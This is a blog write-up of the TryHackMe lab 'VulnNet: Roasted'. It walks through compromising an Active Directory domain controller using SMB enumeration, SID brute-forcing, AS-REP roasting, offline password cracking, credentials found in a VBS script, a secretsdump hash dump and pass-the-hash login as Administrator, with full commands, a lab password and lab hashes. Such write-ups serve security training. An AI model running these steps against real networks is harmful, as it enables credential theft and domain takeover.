---
title: VulnNet:Roasted - Writeup
author: Elman Alizadeh
date: 2022-06-01 15:00:00 +0800
categories: [ctf, TryHackMe]
tags: [tryhackme, vulnnet]
---

Today we will take a look at TryHackMe:VulnNet: Roasted. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/thm-vulnnet/1.jpeg" | relative_url }})

## Network scan

```console
sudo nmap -p- -Pn -sV -sC -oN nmap/open --open 10.10.172.92

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-01 09:46:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP 
(Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP 
(Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49665/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: 
cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8s
| smb2-time: 
|   date: 2022-06-01T09:47:16
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

## Smb

```console
$ smbclient -L 10.10.172.92                                       
Enter WORKGROUP\al1z4deh's password:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin

C$              Disk      Default share

IPC$            IPC       Remote IPC

NETLOGON        Disk      Logon server share 

SYSVOL          Disk      Logon server share 

VulnNet-Business-Anonymous Disk    VulnNet Business Sharing

VulnNet-Enterprise-Anonymous Disk   VulnNet Enterprise Sharing
```

Let’s check the permissions anonymously.

```console
$ smbmap -u anonymous -H  10.10.172.92  

[+] Guest session  IP: 10.10.172.92:445   Name: 10.10.172.92     

Disk                    Permissions             Comment
----                    -----------             -------
ADMIN$                  NO ACCESS               Remote Admin

C$                      NO ACCESS               Default share

IPC$                    READ ONLY               Remote IPC

NETLOGON                NO ACCESS               Logon server share 

SYSVOL                  NO ACCESS               Logon server share 

VulnNet-Business-Anonymous READ ONLY            VulnNet Business Sharing

VulnNet-Enterprise-Anonymous  READ ONLY         VulnNet Enterprise Sharing
```

Since we have the opportunity to read IPC$ without permission, let’s list the usernames

## lookupsid

```
$ impacket-lookupsid anonymous@10.10.172.92 | tee user.txt               
Password:
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Brute forcing SIDs at 10.10.172.92
[*] StringBinding ncacn_np:10.10.172.92[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1589833671-435344116-4136949213
498: VULNNET-RST\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: VULNNET-RST\Administrator (SidTypeUser)
501: VULNNET-RST\Guest (SidTypeUser)
502: VULNNET-RST\krbtgt (SidTypeUser)
512: VULNNET-RST\Domain Admins (SidTypeGroup)
513: VULNNET-RST\Domain Users (SidTypeGroup)
514: VULNNET-RST\Domain Guests (SidTypeGroup)
515: VULNNET-RST\Domain Computers (SidTypeGroup)
516: VULNNET-RST\Domain Controllers (SidTypeGroup)
517: VULNNET-RST\Cert Publishers (SidTypeAlias)
518: VULNNET-RST\Schema Admins (SidTypeGroup)
519: VULNNET-RST\Enterprise Admins (SidTypeGroup)
520: VULNNET-RST\Group Policy Creator Owners (SidTypeGroup)
521: VULNNET-RST\Read-only Domain Controllers (SidTypeGroup)
522: VULNNET-RST\Cloneable Domain Controllers (SidTypeGroup)
525: VULNNET-RST\Protected Users (SidTypeGroup)
526: VULNNET-RST\Key Admins (SidTypeGroup)
527: VULNNET-RST\Enterprise Key Admins (SidTypeGroup)
553: VULNNET-RST\RAS and IAS Servers (SidTypeAlias)
571: VULNNET-RST\Allowed RODC Password Replication Group (SidTypeAlias)
572: VULNNET-RST\Denied RODC Password Replication Group (SidTypeAlias)
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

### /etc/hosts

```console
$ nano /etc/hosts

10.10.172.92 vulnnet-rst.local
```

### Isolate users

```console
$ grep SidTypeUser user.txt | awk '{print $2}' | cut -d "\\" -f2 > users.txt
```

## GetNPUsers

Let’s use GetNPUsers to find users without Kerberos pre-authentication

```console
$ impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users.txt 

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:42e0570569ae76b85ad1a2fcd83e7eec$eb313bbcfd312d35531bff7277c2bbd3ed5f1a4683d41dfd6cd6b2043e604ce7167bcb39bae9dd78f904bd0d53be03ed7fd22fd02b978551eb7890fb63f1287e15a8958f5617ea7137013056390e7f7c0d68bb32716a4adfc4794a75f976e14877a08f20efb7d6f335988f43b27cfa6f598cd6443f89c501b7b7d6bb31b417b593f7fbb79a5f6ce18e75d27018dce51c16e2fd56a4cbea4a9981483e8040b5c63a3f3c275a0c4f9be81187bb931c7457fb724a19cbaed316c8b0fd948fbb1a0edcfdfa583317e7936e6675682e88aa96ab7d05005d9a396073ea354cdf90817e40834a69beb04ea96c751762948672eeb1efc749e847
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

We found a hash for t-skid. Let’s crack the hash.

## John

```console
$ nano hash

$ john hash --wordlist=/usr/share/wordlists/rockyou.txt

Created directory: /home/al1z4deh/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tj********        ($krb5asrep$23$t-skid@VULNNET-RST.LOCAL)     
1g 0:00:00:05 DONE (2022-06-01 13:44) 0.1751g/s 556654p/s 556654c/s 556654C/s tj3929..tj0216044
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Here is the password found. Now let’s enter with smb.

```console
$ smbclient -U VULNNET-RST.LOCAL/t-skid //10.10.172.92/NETLOGON  

Enter VULNNET-RST.LOCAL\t-skid's password: 
Try "help" to get a list of possible commands.
smb: \> ls
.                              D        0  Wed Mar 17 03:15:49 2021

..                             D        0  Wed Mar 17 03:15:49 2021

ResetPassword.vbs              A     2821  Wed Mar 17 03:18:14 2021

8771839 blocks of size 4096. 4553730 blocks available
smb: \> mget ResetPassword.vbs 
Get file ResetPassword.vbs? y

getting file \ResetPassword.vbs of size 2821 as ResetPassword.vbs (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)

There was a file in the folder named ResetPassword.vbs. Let’s transfer it to local machine and look at its contents.
```

```console
└─$ cat ResetPassword.vbs                                                
Option Explicit

Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
Dim strUserDN, objUser, strPassword, strUserNTName' Constants for the NameTranslate object.
Const ADS_NAME_INITTYPE_GC = 3
Const ADS_NAME_TYPE_NT4 = 3
Const ADS_NAME_TYPE_1779 = 1If (Wscript.Arguments.Count <> 0) Then
    Wscript.Echo "Syntax Error. Correct syntax is:"
    Wscript.Echo "cscript ResetPassword.vbs"
    Wscript.Quit
End IfstrUserNTName = "a-*********"
strPassword = "bNd********"' Determine DNS domain name from RootDSE object.
Set objRootDSE = GetObject("LDAP://RootDSE")
strDNSDomain = objRootDSE.Get("defaultNamingContext")' Use the NameTranslate object to find the NetBIOS domain name from the
' DNS domain name.
Set objTrans = CreateObject("NameTranslate")
objTrans.Init ADS_NAME_INITTYPE_GC, ""
objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
' Remove trailing backslash.
strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)' Use the NameTranslate object to convert the NT user name to the
' Distinguished Name required for the LDAP provider.
On Error Resume Next
objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain & "\" & strUserNTName
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
' Escape any forward slash characters, "/", with the backslash
' escape character. All other characters that should be escaped are.
strUserDN = Replace(strUserDN, "/", "\/")' Bind to the user object in Active Directory with the LDAP provider.
On Error Resume Next
Set objUser = GetObject("LDAP://" & strUserDN)
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "User " & strUserNTName _
        & " not found in Active Directory"
    Wscript.Echo "Program aborted"
    Wscript.Quit
End If
objUser.SetPassword strPassword
If (Err.Number <> 0) Then
    On Error GoTo 0
    Wscript.Echo "Password NOT reset for " &vbCrLf & strUserNTName
    Wscript.Echo "Password " & strPassword & " may not be allowed, or"
    Wscript.Echo "this client may not support a SSL connection."
    Wscript.Echo "Program aborted"
    Wscript.Quit
Else
    objUser.AccountDisabled = False
    objUser.Put "pwdLastSet", 0
    Err.Clear
    objUser.SetInfo
    If (Err.Number <> 0) Then
        On Error GoTo 0
        Wscript.Echo "Password reset for " & strUserNTName
        Wscript.Echo "But, unable to enable account or expire password"
        Wscript.Quit
    End If
End If
On Error GoTo 0Wscript.Echo "Password reset, account enabled,"
Wscript.Echo "and password expired for user " & strUserNTName
```

The first lines of the code contain the username and password. Let’s use and log in.

## evil-winrm

```console
$ evil-winrm -i 10.10.172.92 -u a-******* -p "bN*********"

*Evil-WinRM* PS C:\Users\a-whitehat\Documents> cd ..

*Evil-WinRM* PS C:\Users\a-whitehat> cd ..

*Evil-WinRM* PS C:\Users> lsDirectory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/1/2022   2:47 AM                a-whitehat
d-----        3/13/2021   3:20 PM                Administrator
d-----        3/13/2021   3:42 PM                enterprise-core-vn
d-r---        3/11/2021   7:36 AM                Public

*Evil-WinRM* PS C:\Users> cd enterprise-core-vn

*Evil-WinRM* PS C:\Users\enterprise-core-vn> ls

Directory: C:\Users\enterprise-core-vn

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        3/13/2021   3:43 PM                Desktop
d-r---        3/13/2021   3:42 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

*Evil-WinRM* PS C:\Users\enterprise-core-vn> cd Desktop

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> ls

Directory: C:\Users\enterprise-core-vn\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/13/2021   3:43 PM             39 user.txt

*Evil-WinRM* PS C:\Users\enterprise-core-vn\Desktop> type user.txt
```

## Administrator

Let’s use secretsdump to dump the hashes, using the credentials found.

```console
$ impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.172.92 

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation[*] Service RemoteRegistry is in stopped state

[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c**********************:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Now that we have the administrator’s hash, we can login.

```console
Command: evil-winrm -i 10.10.172.92 -u Administrator -H "c*********************"
```

![Desktop View]({{ "/assets/img/thm-vulnnet/2.png" | relative_url }})

### And now we are the Administrator


![Desktop View]({{ "/assets/img/thm-vulnnet/3.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”
